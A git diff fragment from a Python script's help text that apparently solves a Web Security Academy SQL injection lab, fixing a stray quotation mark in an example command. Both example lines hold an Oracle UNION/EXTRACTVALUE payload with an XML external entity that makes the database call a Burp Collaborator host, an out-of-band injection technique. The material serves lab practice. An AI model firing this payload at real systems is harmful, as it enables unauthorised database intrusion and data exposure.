@@ -13,7 +13,7 @@ parser = argparse.ArgumentParser(description="""SQL Injection Web Security Acade
 
 Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><\!DOCTYPE+root+[+<\!ENTITY+%25+remote+SYSTEM+\"http%3a//6houbzn1x291bi1jiwrev4seu50vok.burpcollaborator.net/\">+%25remote%3b]>'),'/l')+FROM+dual--"
 
-Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c ""'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><\!DOCTYPE+root+[+<\!ENTITY+%25+remote+SYSTEM+\"http%3a//6houbzn1x291bi1jiwrev4seu50vok.burpcollaborator.net/\">+%25remote%3b]>'),'/l')+FROM+dual--" -p 127.0.0.1:8080
+Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><\!DOCTYPE+root+[+<\!ENTITY+%25+remote+SYSTEM+\"http%3a//6houbzn1x291bi1jiwrev4seu50vok.burpcollaborator.net/\">+%25remote%3b]>'),'/l')+FROM+dual--" -p 127.0.0.1:8080
 
 Open Burp Collaborator and replace the address in the command with Collaborator's.
 """, usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
